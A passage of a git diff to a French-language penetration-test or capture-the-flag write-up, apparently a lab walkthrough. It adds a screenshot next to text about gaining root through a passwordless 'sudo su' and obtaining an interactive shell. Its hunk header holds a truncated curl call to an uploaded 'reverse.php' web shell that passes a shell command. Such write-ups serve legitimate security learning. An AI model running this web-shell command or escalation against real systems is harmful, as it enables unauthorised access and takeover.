@@ -247,6 +247,8 @@ curl "http://192.168.1.4/assets/fonts/blog/wp-content/uploads/reverse.php?cmd=ba
 ![image15](https://github.com/user-attachments/assets/9ef2b073-2169-4971-9af2-fbf7454b3fad)
 - **Connexion au compte root** : Utilisation de la commande `sudo su` pour accéder au compte root sans nécessité de mot de passe, confirmant une faille majeure dans la gestion des privilèges.
 
+![image](https://github.com/user-attachments/assets/41e823df-f8f3-4b7c-b767-7e1cc1d25238)
+
 ✅ **Nous obtenons un shell interactif sur la machine cible !**
 
 ---
